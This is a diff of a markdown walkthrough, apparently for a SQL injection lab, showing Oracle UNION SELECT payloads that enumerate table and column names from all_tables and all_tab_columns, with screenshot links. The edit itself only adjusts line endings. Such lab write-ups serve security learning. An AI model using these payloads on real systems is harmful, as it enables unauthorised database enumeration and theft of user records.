@@ -5,9 +5,9 @@ step 1 - Get tabel Names\
  ' UNION SELECT table_name,NULL FROM all_tables --\
 <img width="1602" height="907" alt="image" src="https://github.com/user-attachments/assets/d8b90520-9a42-4319-bddc-ecaee3ed3003" />\
 Guess what I found\ 
-   USERS_CPLYZW
-step 2 - Get the columns names
- ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_CPLYZW'--
+   USERS_CPLYZW\
+step 2 - Get the columns names\
+ ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_CPLYZW'--\
 <img width="1602" height="912" alt="image" src="https://github.com/user-attachments/assets/15bf1c90-8b56-4580-9245-82a042875ba1" />\
 USERNAME_OIAGCC\
 <img width="1600" height="907" alt="image" src="https://github.com/user-attachments/assets/533ab3eb-ba58-4e7a-a6fe-59b97d5e2f55" />\
